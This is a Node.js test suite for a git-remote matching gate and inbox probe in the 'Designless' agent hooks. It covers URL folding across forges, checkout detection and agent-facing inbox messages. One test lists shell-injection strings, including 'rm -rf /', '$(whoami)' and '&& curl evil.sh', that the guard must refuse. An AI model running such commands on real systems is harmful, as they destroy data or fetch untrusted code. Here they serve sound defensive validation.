// Right-checkout gate: does this repo hold the edits the canvas is offering?
//
// Run with no dependencies:  node --test hooks/
//
// The vector table below is the SHARED half of a deliberate pair. The server
// folds remote-URL spellings so one repo keeps one canvas session; this gate
// decides whether the checkout you are standing in is the one those edits belong
// to. The two cannot be a single implementation, because this runs inside a short
// hook budget with no network. What keeps them from drifting is that the same
// URLs are asserted on both sides, so a rule added to one and forgotten in the
// other fails here instead of quietly refusing to drain in somebody's repo.
//
// Which direction the failures run matters. A gate that folds too LITTLE refuses
// in the right checkout, which is annoying and safe. A gate that folds too MUCH
// would apply edits to the wrong repo, so every vector below names two spellings
// of ONE repo, and the "different repos stay different" block guards the other side.

import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { execFileSync } from 'node:child_process'
import { remotesMatch, cwdGitRemote, darkCount, attentionDigest, summarizeInbox, socketPath, isSafeRepoRemote, sanitizeInboxRows, pageDrainableHere, reachableCheckout, localCheckoutPath } from './inbox-probe.mjs'

// ── Where the desktop is ─────────────────────────────────────────────────────
// One machine can run more than one Designless app. Unset, the probe looks
// where every shipped app listens; DESIGNLESS_IPC_SOCKET names another
// endpoint explicitly, and the bridge and launcher read the same variable, so
// hooks and bridge can never disagree about which app a session belongs to.
test('socketPath: the default is the per-user address every shipped app listens on', () => {
  const prev = process.env.DESIGNLESS_IPC_SOCKET
  delete process.env.DESIGNLESS_IPC_SOCKET
  try {
    const sp = socketPath()
    assert.ok(sp, 'a unix host always has a default')
    assert.equal(path.basename(sp.sock), 'ipc.sock')
    assert.equal(path.dirname(sp.sock), sp.dir)
  } finally { if (prev !== undefined) process.env.DESIGNLESS_IPC_SOCKET = prev }
})

test('socketPath: an explicit endpoint is used verbatim, with its own directory', () => {
  const prev = process.env.DESIGNLESS_IPC_SOCKET
  process.env.DESIGNLESS_IPC_SOCKET = '/tmp/designless-501/other.sock'
  try {
    assert.deepEqual(socketPath(), { dir: '/tmp/designless-501', sock: '/tmp/designless-501/other.sock' })
  } finally { if (prev === undefined) delete process.env.DESIGNLESS_IPC_SOCKET; else process.env.DESIGNLESS_IPC_SOCKET = prev }
})

test('socketPath: a blank override is no override', () => {
  const prev = process.env.DESIGNLESS_IPC_SOCKET
  process.env.DESIGNLESS_IPC_SOCKET = '   '
  try {
    assert.equal(path.basename(socketPath().sock), 'ipc.sock')
  } finally { if (prev === undefined) delete process.env.DESIGNLESS_IPC_SOCKET; else process.env.DESIGNLESS_IPC_SOCKET = prev }
})

// [label, spelling A, spelling B] — the same repo, written two ways.
const SAME = [
  ['github ssh vs https', 'git@github.com:designlesshq/designless-agent.git', 'https://github.com/designlesshq/designless-agent.git'],
  ['github ssh:// vs https', 'ssh://git@github.com/org/repo.git', 'https://github.com/org/repo.git'],
  ['github .git optional', 'https://github.com/org/repo', 'https://github.com/org/repo.git'],
  ['github trailing slash', 'https://github.com/org/repo/', 'git@github.com:org/repo.git'],
  ['github embedded token', 'https://x-access-token:ghp_abc@github.com/org/repo.git', 'git@github.com:org/repo.git'],
  ['github case', 'git@github.com:DesignlessHQ/Designless-Agent.git', 'https://github.com/designlesshq/designless-agent'],
  ['enterprise host', 'git@git.acme.internal:team/repo.git', 'https://git.acme.internal/team/repo.git'],
  ['gitlab subgroups', 'git@gitlab.com:group/sub/sub2/repo.git', 'https://gitlab.com/group/sub/sub2/repo.git'],
  ['gitlab custom ssh port', 'ssh://git@gitlab.acme.com:2222/group/repo.git', 'https://gitlab.acme.com/group/repo.git'],
  ['bitbucket cloud', 'git@bitbucket.org:team/repo.git', 'https://user@bitbucket.org/team/repo.git'],
  ['bitbucket data center', 'ssh://git@bitbucket.acme.com:7999/PROJ/repo.git', 'https://bitbucket.acme.com/scm/PROJ/repo.git'],
  ['bitbucket personal project', 'ssh://git@bitbucket.acme.com:7999/~john.doe/repo.git', 'https://bitbucket.acme.com/scm/~john.doe/repo.git'],
  ['azure devops', 'git@ssh.dev.azure.com:v3/org/project/repo', 'https://dev.azure.com/org/project/_git/repo'],
  ['azure devops with org user', 'git@ssh.dev.azure.com:v3/org/project/repo', 'https://org@dev.azure.com/org/project/_git/repo'],
  ['trailing newline from git stdout', 'git@github.com:org/repo.git\n', 'https://github.com/org/repo'],
  ['windows CRLF', 'https://github.com/org/repo.git\r\n', 'git@github.com:org/repo.git'],
  ['leading tab', '\tgit@github.com:org/repo.git', 'https://github.com/org/repo'],
  ['doubled separator', 'git@host:/org/repo.git', 'https://host/org/repo'],
]

for (const [label, a, b] of SAME) {
  test(`same repo: ${label}`, () => {
    assert.equal(remotesMatch(a, b), true, `${a}  !=  ${b}`)
  })
}

// The other direction. Folding too aggressively would drain edits into a repo
// they do not belong to, so these must never match.
const DIFFERENT = [
  ['different repo', 'git@github.com:org/repo-a.git', 'git@github.com:org/repo-b.git'],
  ['different owner', 'git@github.com:org-a/repo.git', 'git@github.com:org-b/repo.git'],
  ['different host, same path', 'git@github.com:org/repo.git', 'git@gitlab.com:org/repo.git'],
  ['enterprise vs public github', 'git@git.acme.internal:org/repo.git', 'git@github.com:org/repo.git'],
  ['subgroup is not its parent', 'https://gitlab.com/group/repo.git', 'https://gitlab.com/group/sub/repo.git'],
  ['azure different project', 'https://dev.azure.com/org/proj-a/_git/repo', 'https://dev.azure.com/org/proj-b/_git/repo'],
]

for (const [label, a, b] of DIFFERENT) {
  test(`different repos stay different: ${label}`, () => {
    assert.equal(remotesMatch(a, b), false, `${a}  ==  ${b}`)
  })
}

// A rule written for one forge but matched on every host folds repos that merely
// share a path segment. These are the cases that motivated confining each rule to
// where its forge can actually be, and they are the ones that would silently
// regress if a later rule went back to matching any host.
const NOT_A_FORGE_PATH = [
  ['a group named scm is not Bitbucket', 'https://gitlab.com/scm/build', 'https://gitlab.com/build'],
  ['a group named v3 is not Azure', 'https://gitlab.com/v3/build', 'https://gitlab.com/build'],
  ['a path segment _git is not Azure', 'https://gitlab.com/team/_git/build', 'https://gitlab.com/team/build'],
  ['scm on a deeper path is not Bitbucket', 'https://host.com/scm/a/b/c', 'https://host.com/a/b/c'],
]

for (const [label, a, b] of NOT_A_FORGE_PATH) {
  test(`a forge rule stays on its own forge: ${label}`, () => {
    assert.equal(remotesMatch(a, b), false, `${a}  ==  ${b}`)
  })
}

test('an unknown remote never matches anything', () => {
  assert.equal(remotesMatch(null, 'git@github.com:org/repo.git'), false)
  assert.equal(remotesMatch('', 'git@github.com:org/repo.git'), false)
  assert.equal(remotesMatch('git@github.com:org/repo.git', undefined), false)
  assert.equal(remotesMatch('   ', 'git@github.com:org/repo.git'), false)
})

// ── The guard in front of the normaliser ─────────────────────────────────────
//
// isSafeRepoRemote decides whether a row is SURFACED AT ALL. It is not an
// identity rule and must never drift into behaving like one: anything the
// normaliser folds has to survive it, or a legitimate session is erased before
// anyone can see it. These tests exist because it did drift, and nothing here
// covered it.

test('the guard is never narrower than the normaliser it guards', () => {
  const everySpelling = [...SAME, ...NOT_A_FORGE_PATH].flatMap(([, a, b]) => [a, b])
  for (const remote of everySpelling) {
    assert.equal(isSafeRepoRemote(remote), true, `the normaliser folds it, the guard refused it: ${remote}`)
  }
})

test('a local checkout is surfaced, not erased', () => {
  // The server instructs agents to pass a local repo as file://<abs path>. A row
  // carrying one was dropped whole, so every passive surface reported nothing
  // waiting while real edits sat pending.
  const row = {
    title: 'Skyway',
    n_page: 4,
    repo_remote: 'file:///Users/someone/Projects/skyway/site',
    safety_branch: 'designless/60c93584',
  }
  assert.equal(isSafeRepoRemote(row.repo_remote), true)
  const kept = sanitizeInboxRows([row])
  assert.equal(kept.length, 1, 'the session must survive the sanitiser')
  assert.equal(kept[0].n_page, 4, 'and its pending edits must still be visible')
})

test('ssh:// survives, so the folding written for it is reachable', () => {
  assert.equal(isSafeRepoRemote('ssh://git@bitbucket.acme.com:7999/PROJ/repo.git'), true)
  assert.equal(isSafeRepoRemote('ssh://git@ssh.dev.azure.com:v3/org/project/repo'), true)
})

test("injection is still refused, which is this guard's actual job", () => {
  for (const bad of [
    'https://github.com/o/r.git; rm -rf /',
    'file:///tmp/$(whoami)',
    'git@host:o/r`id`',
    'https://host/o/r && curl evil.sh',
    'https://host/o/r\nwhoami',
    "https://host/o/r'",
    'file:///tmp/a b',
    '',
    '   ',
  ]) {
    assert.equal(isSafeRepoRemote(bad), false, `should have been refused: ${JSON.stringify(bad)}`)
  }
  assert.equal(isSafeRepoRemote(null), false)
  assert.equal(isSafeRepoRemote(42), false)
})

test('a malformed remote still drops its row; an absent one does not', () => {
  const base = { title: 'x', n_page: 1, safety_branch: 'designless/abc' }
  assert.equal(sanitizeInboxRows([{ ...base, repo_remote: 'https://h/o/r; id' }]).length, 0)
  assert.equal(sanitizeInboxRows([{ ...base, repo_remote: null }]).length, 1)
  assert.equal(sanitizeInboxRows([{ ...base, safety_branch: 'main' }]).length, 0)
})

// cwdGitRemote reads git's own files rather than shelling out, so the two shapes
// of `.git` both have to be handled: a directory in a normal clone, and a FILE
// pointing elsewhere in a linked worktree. The worktree case used to throw and
// leave the gate with an unknown checkout, which falls through to allowing.
test('reads origin from a normal clone and from a linked worktree', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-gate-'))
  const repo = path.join(root, 'repo')
  const tree = path.join(root, 'wt')
  const git = (cwd, ...a) => execFileSync('git', a, { cwd, stdio: 'pipe' })

  fs.mkdirSync(repo)
  git(repo, 'init', '-q', '-b', 'main')
  git(repo, 'remote', 'add', 'origin', 'git@github.com:designlesshq/designless-agent.git')
  git(repo, 'config', 'user.email', 'gate@example.invalid')
  git(repo, 'config', 'user.name', 'gate')
  fs.writeFileSync(path.join(repo, 'f'), 'x')
  git(repo, 'add', 'f')
  git(repo, 'commit', '-qm', 'seed')
  git(repo, 'worktree', 'add', '-q', tree, '-b', 'side')

  const expected = 'github.com/designlesshq/designless-agent'
  assert.equal(cwdGitRemote(repo), expected, 'normal clone')
  assert.equal(fs.statSync(path.join(tree, '.git')).isFile(), true, 'worktree .git should be a file')
  assert.equal(cwdGitRemote(tree), expected, 'linked worktree')

  // And the https spelling of the very same repo still matches from either.
  assert.equal(remotesMatch(cwdGitRemote(tree), 'https://github.com/designlesshq/designless-agent.git'), true)

  fs.rmSync(root, { recursive: true, force: true })
})

test('no git, no origin: unknown rather than a wrong answer', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-nogit-'))
  assert.equal(cwdGitRemote(dir), null)
  fs.rmSync(dir, { recursive: true, force: true })
})

// The test above is named for two cases and only ever covered one: a directory
// with no git at all. "git, but no origin" was never asserted, which is how a
// local-only checkout came to be unrecognisable to itself.

test('a repo with no origin identifies itself by its path', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-local-'))
  execFileSync('git', ['init', '-q'], { cwd: dir })
  const id = cwdGitRemote(dir)
  assert.ok(id, 'a local-only checkout must have an identity, not null')
  // The server records this checkout as file://<abs path>; both sides must fold
  // to the same string or the drain gate sends the person to where they are.
  assert.equal(remotesMatch(id, `file://${fs.realpathSync(dir)}`), true)
  fs.rmSync(dir, { recursive: true, force: true })
})

test('an origin still wins over the path fallback', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-origin-'))
  execFileSync('git', ['init', '-q'], { cwd: dir })
  execFileSync('git', ['remote', 'add', 'origin', 'git@github.com:org/repo.git'], { cwd: dir })
  assert.equal(remotesMatch(cwdGitRemote(dir), 'https://github.com/org/repo'), true)
  fs.rmSync(dir, { recursive: true, force: true })
})

test('the drain gate recognises a local checkout as HERE, end to end', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'dl-e2e-'))
  execFileSync('git', ['init', '-q'], { cwd: dir })
  const row = {
    title: 'Skyway',
    n_page: 4,
    repo_remote: `file://${fs.realpathSync(dir)}`,
    safety_branch: 'designless/60c93584',
  }
  // the exact expression canvas-drain-check.mjs uses to decide drainability
  const origin = cwdGitRemote(dir)
  const here = sanitizeInboxRows([row]).filter(
    (x) => Number(x.n_page || 0) > 0 && (x.repo_remote ? remotesMatch(origin, x.repo_remote) : true),
  )
  assert.equal(here.length, 1, 'the session must be drainable in the checkout it belongs to')
  assert.equal(here[0].n_page, 4)
  fs.rmSync(dir, { recursive: true, force: true })
})

// ── Finding the checkout you are actually standing in ───────────────────────
//
// cwdGitRemote only looks AT cwd. Two ordinary layouts are the right checkout
// and used to route the person to "another repo": the app repo one directory
// below the folder they opened, and standing in a subdirectory of the repo.

const mkRepo = (dir) => { fs.mkdirSync(dir, { recursive: true }); execFileSync('git', ['init', '-q'], { cwd: dir }); return dir }
const pageRow = (repoDir) => ({ title: 'Skyway', n_page: 1, repo_remote: `file://${repoDir}`, safety_branch: 'designless/abc' })

test('localCheckoutPath reads a file:// remote and ignores every other kind', () => {
  assert.equal(localCheckoutPath('file:///Users/me/app'), '/Users/me/app')
  assert.equal(localCheckoutPath('file:///Users/me/my%20app'), '/Users/me/my app')
  assert.equal(localCheckoutPath('https://github.com/o/r.git'), null)
  assert.equal(localCheckoutPath('git@github.com:o/r.git'), null)
  assert.equal(localCheckoutPath(null), null)
})

test('the repo one directory below the folder you opened is HERE', () => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-below-')))
  const repo = mkRepo(path.join(root, 'site'))
  const s = pageRow(repo)
  assert.equal(pageDrainableHere(s, cwdGitRemote(root), root), true)
  assert.equal(reachableCheckout(s, root), repo)
  fs.rmSync(root, { recursive: true, force: true })
})

test('standing inside the repo is HERE', () => {
  const repo = fs.realpathSync(mkRepo(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-inside-'))))
  const sub = path.join(repo, 'src', 'deep'); fs.mkdirSync(sub, { recursive: true })
  assert.equal(pageDrainableHere(pageRow(repo), cwdGitRemote(sub), sub), true)
  fs.rmSync(repo, { recursive: true, force: true })
})

test('a checkout outside the tree you opened is NOT here', () => {
  const a = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-a-')))
  const b = fs.realpathSync(mkRepo(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-b-'))))
  // Containment: a server-supplied path must never send an agent somewhere the
  // person did not open, however real that path is.
  assert.equal(pageDrainableHere(pageRow(b), cwdGitRemote(a), a), false)
  assert.equal(reachableCheckout(pageRow(b), a), null)
  fs.rmSync(a, { recursive: true, force: true }); fs.rmSync(b, { recursive: true, force: true })
})

test('a path inside the tree that is not a repo is NOT here', () => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-norepo-')))
  const notRepo = path.join(root, 'site'); fs.mkdirSync(notRepo)
  assert.equal(pageDrainableHere(pageRow(notRepo), cwdGitRemote(root), root), false)
  fs.rmSync(root, { recursive: true, force: true })
})

test('the drain line names the checkout when it is not where you are standing', () => {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-hint-')))
  const repo = mkRepo(path.join(root, 'site'))
  const out = summarizeInbox([pageRow(repo)], root)
  const said = out?.line || (Array.isArray(out?.lines) ? out.lines.join(' ') : String(out ?? ''))
  assert.match(said, /drainable from this checkout/)
  assert.ok(said.includes(repo), `the line must name where to work, got: ${said.slice(0, 200)}`)
  fs.rmSync(root, { recursive: true, force: true })
})

test('a remote-backed session is unaffected by any of this', () => {
  const repo = fs.realpathSync(mkRepo(fs.mkdtempSync(path.join(os.tmpdir(), 'dl-remote-'))))
  execFileSync('git', ['remote', 'add', 'origin', 'git@github.com:org/repo.git'], { cwd: repo })
  const s = { title: 'x', n_page: 1, repo_remote: 'https://github.com/org/repo', safety_branch: 'designless/abc' }
  assert.equal(pageDrainableHere(s, cwdGitRemote(repo), repo), true)
  const other = { ...s, repo_remote: 'https://github.com/org/DIFFERENT' }
  assert.equal(pageDrainableHere(other, cwdGitRemote(repo), repo), false)
  fs.rmSync(repo, { recursive: true, force: true })
})

// ── The dark count (fail-safe A) reaches the wake line ───────────────────────
//
// The server has carried `attn_dark` on the inbox since 2026-08-20, naming the
// every-turn agent check as its consumer. Nothing read it for 13 days: the
// desktop frame dropped it and this probe never asked. These pin the reader.

test('darkCount: a number is a count, absence is unknown, never zero', () => {
  assert.equal(darkCount(1), 1)
  assert.equal(darkCount(0), 0)
  assert.equal(darkCount('2'), 2)
  assert.equal(darkCount(undefined), null)
  assert.equal(darkCount(null), null)
  assert.equal(darkCount('many'), null)
  assert.equal(darkCount(-1), null)
})

test('attentionDigest: without a dark count the digest is byte-identical to before', () => {
  const rows = [{ session_id: 'b', n_needs_human: 1, attention_reason: 'gate_refused' }, { session_id: 'a', n_needs_human: 2 }]
  assert.equal(attentionDigest(rows), 'a:2:|b:1:gate_refused')
  assert.equal(attentionDigest(rows, null), 'a:2:|b:1:gate_refused')
  assert.equal(attentionDigest(rows, 0), 'a:2:|b:1:gate_refused')
  assert.equal(attentionDigest([]), 'none')
  assert.equal(attentionDigest([], null), 'none')
})

test('attentionDigest: the dark count moves the digest, alone or beside rows', () => {
  assert.equal(attentionDigest([], 1), 'dark:1')
  assert.notEqual(attentionDigest([], 1), attentionDigest([], 2))
  const rows = [{ session_id: 'a', n_needs_human: 1 }]
  assert.notEqual(attentionDigest(rows, 1), attentionDigest(rows))
})

test('summarizeInbox: a dark count speaks beside an EMPTY listing, inform-only, with no apply tail', () => {
  const text = summarizeInbox([], os.tmpdir(), { includeAttention: true, attnDark: 1 })
  assert.match(text, /waited more than a day/)
  assert.match(text, /Designless app/)
  assert.match(text, /Do not act on it/)
  assert.doesNotMatch(text, /After applying/)
  assert.doesNotMatch(text, /session_id|claim|apply_type1/)
  // Nothing to apply, so the apply contract must not be read into this message.
  assert.doesNotMatch(text, /Apply them on sight/)
})

test('summarizeInbox: the dark line obeys the once-per-change gate', () => {
  assert.equal(summarizeInbox([], os.tmpdir(), { includeAttention: false, attnDark: 3 }), '')
})

test('summarizeInbox: an absent dark count says nothing', () => {
  assert.equal(summarizeInbox([], os.tmpdir(), { includeAttention: true }), '')
  assert.equal(summarizeInbox([], os.tmpdir(), { includeAttention: true, attnDark: null }), '')
  assert.equal(summarizeInbox([], os.tmpdir(), { includeAttention: true, attnDark: 0 }), '')
})

test('summarizeInbox: the apply tail still follows waiting edits, dark or not', () => {
  const text = summarizeInbox([{ session_id: 's', n_artefact: 1, title: 'Deck' }], os.tmpdir(), { includeAttention: true, attnDark: 1 })
  assert.match(text, /After applying/)
  assert.match(text, /waited more than a day/)
})

// THE REPORTED FAILURE. An agent read this block, named the document correctly,
// and then wrote "they're yours whenever you want them applied, and I can drain
// them now if you do". It had the instruction and still offered.
//
// The hook's job is the FACT and the imperative, nothing more: the contract that
// says applying needs no permission is served with the inbox response, which is
// where prose belongs and where it can change without a plugin release. What is
// pinned here is that this line ends on the instruction, names the document, and
// never suggests waiting.
test('summarizeInbox: waiting edits end on the instruction, not on how to narrate them', () => {
  const text = summarizeInbox([{ session_id: 's', n_artefact: 2, title: 'Making the Case for Goa' }], os.tmpdir(), {})
  assert.match(text, /"Making the Case for Goa"/, 'the document is named, so the agent can name it too')
  assert.match(text, /Apply them now/)
  assert.doesNotMatch(text, /if you want|whenever you|would you like/i, 'the hook never offers')
})

// The do-not-act rule belongs to the attention lines alone. It sat next to the
// waiting-edit lines with nothing scoping it, which is how "do not act" reached
// work that was the agent's to apply.
test('summarizeInbox: the inform-only rule says it does not reach the edits above it', () => {
  const text = summarizeInbox(
    [{ session_id: 's', n_artefact: 1, title: 'Deck' }, { session_id: 't', n_needs_human: 1, brand_slug: 'acme' }],
    os.tmpdir(),
    { includeAttention: true },
  )
  assert.match(text, /Do not act on it/)
  assert.match(text, /the waiting edits above are yours to apply/)
})

test('summarizeInbox: an attention-only message no longer ends with an apply tail over nothing', () => {
  const text = summarizeInbox([{ session_id: 's', n_needs_human: 1, brand_slug: 'acme' }], os.tmpdir(), { includeAttention: true })
  assert.match(text, /waiting for them in the canvas/)
  assert.doesNotMatch(text, /After applying/)
  assert.doesNotMatch(text, /Apply them on sight/)
})
